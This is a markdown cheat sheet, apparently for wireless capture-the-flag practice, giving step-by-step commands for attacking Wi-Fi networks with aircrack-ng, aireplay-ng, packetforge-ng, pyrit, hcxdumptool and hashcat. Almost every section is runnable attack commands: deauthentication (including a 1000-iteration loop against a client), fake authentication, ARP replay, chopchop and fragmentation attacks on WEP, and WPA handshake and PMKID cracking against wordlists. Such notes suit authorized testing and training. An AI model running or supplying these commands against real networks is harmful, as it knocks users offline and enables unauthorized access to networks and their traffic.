# Always Be Collecting
[install_pentoo](https://www.pentoo.ch/download/)

* [Always Be Collecting](#always-be-collecting)
* [Procedures, Notes, and Tips](#procedures-notes-and-tips)
  * [Network Manager CLI](#network-manager-cli)
  * [Collecting and Cracking](#collecting-and-cracking)
  * [WEP without clients](#wep-without-clients)
  * [WPA/WPA2 with clients](#wpawpa2-with-clients)
  * [aircrack-ng](#aircrack-ng)
    * [airmon-ng](#airmon-ng)
    * [aireplay-ng](#aireplay-ng)
    * [Quick summary](#quick-summary)
    * [Deauthentication](#deauthentication)
    * [Fake Authentication](#fake-authentication)
    * [Interactive packet replay](#interactive-packet-replay)
    * [ARP request replay attack](#arp-request-replay-attack)
    * [KoreK chopchop attack](#korek-chopchop-attack)
    * [Fragmentation attack](#fragmentation-attack)
    * [packetforge-ng](#packetforge-ng)
    * [airolib-ng](#airolib-ng)
  * [pyrit](#pyrit)
  * [hcxdumptool](#hcxdumptool)
    * [hcxpcaptool](#hcxpcaptool)
  * [wifite](#wifite)
* [Quick &amp; Useful](#quick--useful)
  * [Loops](#loops)
  * [Regex](#regex)
  * [Configure interface](#configure-interface)
  * [Wireshark &amp; tshark](#wireshark--tshark)
* [Sources](#sources)

## Procedures, Notes, and Tips
### Network Manager CLI
Using [nmcli](https://manpages.ubuntu.com/manpages/bionic/en/man1/nmcli.1.html) to list and connect to WiFi networks.

List the available networks.
```bash
$ nmcli device wifi list
```

Connect to the available network. Add parameter `--ask` for password.
```bash
$ nmcli connection up ap-name
```

Using [nmtui](https://manpages.ubuntu.com/manpages/xenial/en/man1/nmtui.1.html) to list and connect to WiFi networks.
```bash
$ nmtui
```

### Collecting and Cracking
Check the wireless interface(s) with `iwconfig` and start monitoring mode.
```
$ airmon-ng start wlx123456790
```

Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_test) work.
```
$ aireplay-ng -9 -e ap_name wlan0mon
```

Find surrounding networks, access points and clients
```bash
$ airodump-ng wlan0mon
```

Begin collection on target channel, BSSID and recording to file.
  - `-c` Select channel number
  - `-w` Write to file
  - `--bssid` MAC address of access point
  - `--ivs` Save only captured IVs (optional)
  - `--band` Select the wireless band. 'b' and 'g' uses 2.4GHz and 'a' uses 5GHz.
```bash
$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs --band a -w capture wlan0mon
```

### WEP without clients
Steps to perform an attack on a WEP access point with no associated clients. The access point must be broadcasting data for this to work.
  1) Monitor and capture the target network traffic using `airodump-ng`.
  2) In a new console execute Fake Authentication attack method.
  3) In a new console execute Fragmentation or chopchop attack methods.
  4) Create an arp packet with `packetforge-ng`.
  5) Inject the arp packet using `aireplay-ng -2`.
  6) Run `aircrack-ng` to obtain the WEP key.

### WEP SKA with clients
Steps to perform an attack on WEP access point configured to Shared-Key Authentication (SKA) with clients. 

### WPA/WPA2 with clients
Steps to perform an attack on a WPA/WPA2 access point with clients. The pre-shared (PSK) must be in the wordlists used.

There is a bug in versions older than 1.5 where this will fail.
  1) Monitor and capture the target network traffic using `airodump-ng`.
  2) In a new console execute Deauthentication attack method on associated client(s).
  3) Run `aircrack-ng` to obtain the PSK.

### aircrack-ng
Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
```bash
$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
```

Invoke PTW WEP cracking method method on an arp replay.
```bash
$ aircrack-ng -z replay_arp-0309-015802.cap
```

### airmon-ng
Set interface to monitor mode.
```bash
$ airmon-ng start wlx9cefd5fd1181
```

Stop monitor mode and restart networking.
```
$ airmon-ng stop wlan0mon
$ systemctl restart network-manager.service
```

Checking and kill networking services.
```
$ airmon-ng check kill
```

### aireplay-ng

#### Quick summary
Use `-D` for 5ghz bands. Attack modes (Numbers can still be used):

  - `--deauth`or `-0`
  - `--fakeauth` or `-1`
  - `--interactive`or `-2`
  - `--arpreplay` or `-3`
  - `--chopchop` or `-4`
  - `--fragment` or `-5`
  - `--test` or `-9`

#### Deauthentication
Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
  - `-0` Set for `deauthentication` mode
  - `-e` Target access point ESSID
  - `-a` Target access point MAC address
  - `-c` Set destination MAC address
```bash
$ aireplay-ng -0 5 -e ap_name -a ap_mac -c client_mac wlan0mon
```

#### Fake Authentication
Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
  - `-1` Set for fake authentication attack
  - `180` Reassociation timing in seconds
  - `-o` Number of packets to send at a time
  - `-q` Frequency to send keep-alive packets
  - `-e` Target access point network name
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
```

#### Interactive packet replay
Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
  - `-2` Set for interactive packet replay attack mode
  - `-r` ARP file to replay
```bash
$ aireplay-ng -2 -r arp-request wlan0mon
```

#### ARP request replay attack
Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
  - `-3` Set for ARP request replay attack mode
  - `-x` Number of packets-per-second
  - `-r` Extract packets from target pcap file
  - `-b` Target access point BSSID
  - `-h` Set source MAC address
```bash
$ aireplay-ng -3 -x 100 -r replay.cap -b ap_mac -h our_mac wlan0mon
```

#### KoreK chopchop attack
Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
  - `-4` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
```

#### Fragmentation attack
Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation).
  - `-5` Set for chopchop attack
  - `-b` Target access point MAC address
  - `-h` Our wireless card's MAC address
```bash
$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
```

#### packetforge-ng
Generate packets for injection from PRGA capture.

Summary of different modes:
  - `--arp` or `-0` for ARP packet
  - `--udp` or `-1` for UDP packet
  - `--icmp` or `-2` for ICMP packet
  - `--null` or `-3` for a null packet
  - `--custom` or `-9` for a custom packet

Additional example:
  - `-0` Set for generate arp packet
  - `-a` Target access point MAC address
  - `-h` Our wireless card's MAC address
  - `-k` Destination IP address (255.255.255.255)
  - `-l` Source IP address (255.255.255.255)
  - `-y` XOR file to read the PRGA from
  - `-w` Write to file
```bash
$ packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
```

#### airolib-ng
[airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng) is the database to store essid's, captured PMKs, import password lists and accelerate handshake cracking.
Create database and import essid file.
```bash
$ airolib-ng wctf --import essid wctf_essids
```

Import password list(s).
```bash
$ airolib-ng wctf --import passwd /usr/share/wordlists/cyberpunk.words
```

Begin batch processing of passwords to essid's.
```bash
$ airolib-ng wctf --batch
```

### pyrit
[pyrit](https://tools.kali.org/wireless-attacks/pyrit) is a WPA/WPA2-PSK tool that allows for creating a large database for authentication and cracking.
Analyze a packet capture file.
```bash
$ pyrit -r capture.cap analyze
```

Import passwords from a file into the database.
```bash
$ pyrit -i /usr/share/wordlists/spy_vs_spy.words import_passwords
```

Create a new ESSID (or `-b` for BSSID) into the database.
```bash
$ pyrit -e "access_point" create_essid
```

Batch process the database.
```bash
$ pyrit batch
```

Attack all handshakes from the database.
```bash
$ pyrit -r capture.cap --all-handshakes attack_db
```

### hcxdumptool
This technique requires a slightly different approach and is used against PSK networks. Set up the interface below.
```bash
$ ip link set wlan1mon down
$ iwconfig wlan1mon mode monitor
$ ip link set wlan1mon up
```

Save the target BSSIDs to a file. Begin capturing with filtered parameters.
```bash
$ hcxdumptool -i wlan1mon --enable_status -c 1 -o capture.pcapng --filterlist=filter_list --filtermode=2
```
_Section not finished._

#### hcxpcaptool
Use `hcxpcaptool` to extract the PMK hash IDs.
```bash
$ hcxpcaptool -k pmkidhash capture.cap
```

Run `hashcat` to attempt to decrypt the PMK hash IDs.
```bash
$ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
```

### wifite
[wifite](https://github.com/derv82/wifite2) is a tool that automates the process. Follow the instructions to cheat.

## Quick & Useful

### Loops
Loop deauthentication attack to target client.
```bash
$ for s in `seq 1 1000`; do sleep 1 && aireplay-ng -0 1 -e ap_name -a ap_mac -c <number> wlan0mon; done
```

### Regex
Filter target ESSIDs.
```bash
$ airodump-ng wlan0mon --essid-regex "^(ap_name).*$"
$ airodump-ng wlan0mon --essid-regex ^.*(one|two|three).*$
$ airodump-ng wlan0mon --essid-regex "WCTF_([0-9]{1,2}|W.*)"
```

### Configure interface
Set link up or down.
```bash
$ ip link set wlan0mon down
$ ip link set wlan0mon up
```

Set modes monitor or managed.
```bash
$ iwconfig wlan0mon mode managed
$ iwconfig wlan0mon mode monitor
```

Force channels. Good for injection card.
```bash
$ iwconfig wlan1mon channel 6
$ iwconfig wlan1mon channel 136
$ iw dev wlan1mon set channel 6
```

### Wireshark & tshark
Using Wireshark to filter target packets.
```bash
wlan.addr == target_mac && wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol
```

Using tshark to extract the handshakes.
```bash
$ tshark -r filter.pcap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == ap_mac" -2
```

## Sources
 * [Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial)
 * [Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
 * [Tutorial: How to crack WEP with no wireless clients](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)
 * [Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)
 * [How to extract all handshakes from a capture file with several handshakes](https://miloserdov.org/?p=1047)
